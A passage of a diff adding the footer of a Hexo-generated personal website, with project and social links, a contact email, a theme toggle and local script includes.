+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
